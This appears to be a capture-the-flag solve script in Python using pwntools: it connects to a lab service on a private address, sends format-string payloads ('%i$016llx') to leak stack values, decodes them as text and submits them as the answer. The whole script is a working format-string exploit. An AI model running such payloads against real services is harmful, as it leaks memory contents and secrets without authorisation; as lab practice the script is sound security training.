from pwn import *
import re
import time

from pwn import * 

target = remote("10.110.2.100", 5000)

print(target.recv())
target.sendline(b"Team1")
time.sleep(0.1)
print(target.recv())
target.sendline(b"7")
time.sleep(0.1)
print("->" + str(target.recv()))
for i in range(1,15):
    payload = "%"+str(i)+"$016llx"
    target.sendline(payload.encode())
    time.sleep(0.1)
    line = target.recv()
    print(line)
    try:
        value = re.findall("You answered: (.*?)\\\\n",str(line))
        test = bytes.fromhex(value[0][2:]).decode("ASCII")[::-1]
        target.sendline(test.encode())
        time.sleep(0.1)
        ans = target.recv()
        print("Payload->" + str(payload))
        print(ans)
        if "Correct!" in str(ans):
            target.close()
            break
    except:
        ola=1
